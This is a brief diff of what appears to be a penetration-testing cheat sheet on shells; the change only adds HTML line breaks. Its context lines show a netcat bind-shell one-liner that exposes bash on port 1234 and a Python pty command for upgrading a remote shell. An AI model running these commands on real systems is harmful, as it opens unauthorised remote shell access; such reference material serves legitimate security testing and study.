@@ -26,6 +26,6 @@ mkfifo /tmp/f ; nc -lk 1234 0< /tmp/f | /bin/bash 1> /tmp/f
 # Getting a better Shell
 If executing bash without the '-i' flag, typical shell features will be lost. Below are several ways to gain a better shell.
 
-Python Method:
-#Once are connected to the remote host issue the following
+Python Method:<br>
+#Once are connected to the remote host issue the following<br>
 python -c 'import pty; pty.spawn("/bin/bash")'
